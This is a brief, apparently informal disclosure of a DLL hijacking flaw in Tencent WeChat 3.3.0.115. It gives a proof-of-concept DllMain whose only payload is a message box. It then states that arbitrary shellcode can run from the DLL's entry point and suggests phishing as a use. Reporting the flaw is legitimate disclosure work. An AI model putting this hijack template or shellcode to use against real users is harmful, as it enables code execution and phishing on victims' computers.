`qqqq`

DLL hijacking found in Tencent wechat, version 3.3.0.115

demonstration

For example:

```
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hModule);
		MessageBox(NULL, (LPCTSTR)TEXT("1"), (LPCTSTR)TEXT("1"), MB_OK);
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{



}
return TRUE;

}
```

You can define any code and shellcode to execute in the DLL's entry function!!

Very simple, we can be used for rights protection or phishing!!!

